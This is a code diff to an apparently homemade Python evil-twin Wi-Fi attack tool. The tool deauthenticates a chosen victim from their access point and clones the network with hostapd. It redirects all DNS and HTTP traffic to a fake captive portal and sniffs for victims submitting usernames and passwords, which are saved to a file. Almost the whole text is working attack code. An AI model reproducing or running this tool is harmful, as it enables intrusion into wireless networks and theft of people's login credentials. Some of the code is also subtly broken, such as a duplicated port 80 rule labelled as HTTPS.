@@ -10,6 +10,7 @@ import time
 import netifaces
 import http.server
 from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
+from scapy.layers.http import HTTPRequest
 from scapy.layers.l2 import Ether
 
 mac = ''
@@ -222,13 +223,13 @@ def deauth(target_mac, iface, count):
     global client_AP
     bssid = client_AP[target_mac]['BSSID']
     dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
-    frame = RadioTap() / dot11 / Dot11Deauth(reason=1)
+    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
     os.system("iwconfig " + iface + " channel " + str(client_AP[target_mac]['channel']))
     print("[+] started deauth attack...")
     sendp(frame, iface=iface, count=count, inter=.1, verbose=1)
 
 
-def launchHostapd(iface, net):
+def configHostapd(iface, net):
     global AP
     # Hostapd configuration
     os.system("service hostapd stop")
@@ -238,11 +239,10 @@ def launchHostapd(iface, net):
 
     hostapdConfig = ''
     hostapdConfig += 'interface=' + iface + '\n'  # Interface used
-    hostapdConfig += 'driver=nl80211\n'  # Driver interface typr
+    hostapdConfig += 'driver=nl80211\n'  # Driver interface type
     hostapdConfig += 'ssid=' + AP[net]['ESSID'] + '\n'  # SSID
     hostapdConfig += 'hw_mode=g\n'  # Hardware mode (802.11g)
     hostapdConfig += 'channel=' + AP[net]['channel'] + '\n'  # Channel
-    hostapdConfig += 'ignore_broadcast_ssid=0\n'  # Require stations to know SSID to connect (ignore probe requests
     f = open(hostapdConfigFile, 'w')
     f.write(hostapdConfig)
     f.close()
@@ -252,7 +252,10 @@ def launchHostapd(iface, net):
     print('[+] hostapd successfully configured')
 
 
-def launchDnsmasq(iface):
+def configDnsmasq(iface):
+    os.system('service dnsmasq stop')
+    # clear port 53
+    os.system('service systemd-resolved stop')
     # Stop dnsmasq  in case it's active
     os.system('service dnsmasq stop')
     # Flush iptables to avoid conflicts
@@ -261,7 +264,6 @@ def launchDnsmasq(iface):
     os.system('iptables -t nat -F')
     print('[+] Iptables flushed')
     # Config dnsmasq
-    dnsmasqHostsFile = 'hosts'
     dnsmasqConfigFile = 'dnsmasq.conf'
     dnsmasqConfig = ''
     print('[+] Configuring dnsmasq...')
@@ -269,21 +271,26 @@ def launchDnsmasq(iface):
     dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
     dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'  # Set router to 10.0.0.1
     dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'  # Set dns server to 10.0.0.1
-    dnsmasqConfig += 'log-queries\n'  # Log all queries
     dnsmasqConfig += 'address=/#/10.0.0.1\n'  # Response to every DNS query with 10.0.0.1 (where our captive portal is)
 
     f = open(dnsmasqConfigFile, 'w')
     f.write(dnsmasqConfig)
-    f.close
-    # Configures dnsmasq to assign the interface ip to the domain name so
-    # mod_rewrite  from .htaccess can reffer directly to the domain name in the URL
-    f = open(dnsmasqHostsFile, 'w')
-    f.write('10.0.0.1 wifiportal2.aire.en')
     f.close()
+
     # Set inet address of interface to 10.0.0.1
-    os.system('ifconfig ' + iface + ' 10.0.0.1')
+    os.system('ifconfig ' + iface + ' 10.0.0.1 netmask 255.255.255.0')
+    # route http traffic to captive portal page
+    os.system(
+        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 80 -j DNAT --to-destination 10.0.0.1')
+    # route https traffic to captive portal page
+    os.system(
+        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 80 -j DNAT --to-destination 10.0.0.1')
     # Initialize dnsmasq
-    os.system('dnsmasq -C ' + dnsmasqConfigFile + " -H " + dnsmasqHostsFile)
+    os.system('dnsmasq -C ' + dnsmasqConfigFile)
+    print('[+] dnsmasq successfully configured')
+
+    # Initialize dnsmasq
+    os.system('dnsmasq -C ' + dnsmasqConfigFile)
     print('[+] dnsmasq successfully configured')
 
 
@@ -291,32 +298,33 @@ def config_portal():
     # Config captive portal files
     print('[+] Copying web files...')
     os.system('rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
-    os.system('cp -r captive_portal /var/www/html/captive_portal')
-    os.system('chmod 777 /var/www/html/captiveportal')
-    os.system('chmod 777 /var/www/html/captiveportal/*')
+    os.system('cp -r captiveportal/* /var/www/html')
+    os.system('chmod 777 /var/www/html/*')
+    os.system('chmod 777 /var/www/html')
     print('[+] Web files copied succesfuly')
 
     # Enable rewrite and override for .htaccess and php
-    print('[-] Configuring apache2...\n')
-    os.system('cp -f override.conf /etc/apache2/conf-available/')
-    os.system('a2enconf override')
+    print('[+] Configuring apache2...\n')
+    os.system('cp -f 000-default.conf /etc/apache2/sites-enabled/')
     os.system('a2enmod rewrite')
     os.system('a2enmod php' + str(php_version))
     # reload and restart apache2
-    os.system('service apache2 reload')
     os.system('service apache2 restart')
+    print('[+] apache2 configured successfully\n')
 
-# handler to check if victim connected to our ap
-def dhcp_handler(pkt):
-    global victim
-    if pkt.haslayer(Ether):
-        if pkt.getlayer(Ether).dst == victim.lower():
-            print("[+] victim ", pkt.getlayer(Ether).dst, " has connected to our access point")
-            return True
+
+def handler2(pkt):
+    if pkt.haslayer(HTTPRequest):
+        packet = str(pkt)
+        if packet.find('POST'):
+            print("[+] ", pkt.getlayer(Ether).src, " has submitted his username and password "
+                                                   "check /var/www/html/captiveportal/passwords.txt")
+    else:
+        if pkt.haslayer(Ether):
+            print("[+]", pkt.getlayer(Ether).dst, " has connected to our access point")
 
 
 if __name__ == "__main__":
-    global victim
     interface, channel, count = arg_parse()
     print(presentation)
     progress()
@@ -338,9 +346,20 @@ if __name__ == "__main__":
     output_client(network)
     victim = input("enter the mac address of the station you want to attack: ")
     time.sleep(1)
-    deauth(victim, interface, count)
-    launchHostapd(interface, network)
+    config_portal()
     time.sleep(1)
-    launchDnsmasq(interface)
+    deauth(victim, interface, count)
+    configHostapd(interface, network)
+    time.sleep(1)
+    configDnsmasq(interface)
+    time.sleep(1)
+    sniff(iface=interface, filter='(udp and (src port 67 and dst port 68)) or dst port 80', prn=handler2)
 
-    sniff(iface=interface, filter='udp and (src port 67 and dst port 68)', stop_filter=dhcp_handler)
+    '''print('[+] Flushing iptables...')
+    os.system('iptables -F')
+    os.system('iptables -t nat -F')
+    print('[+] Iptables flushed')
+    os.system("killall dnsmasq")
+    os.system("killall hostapd")
+    os.system("rm hostapd.conf")
+    os.system("rm dnsmasq.conf")'''
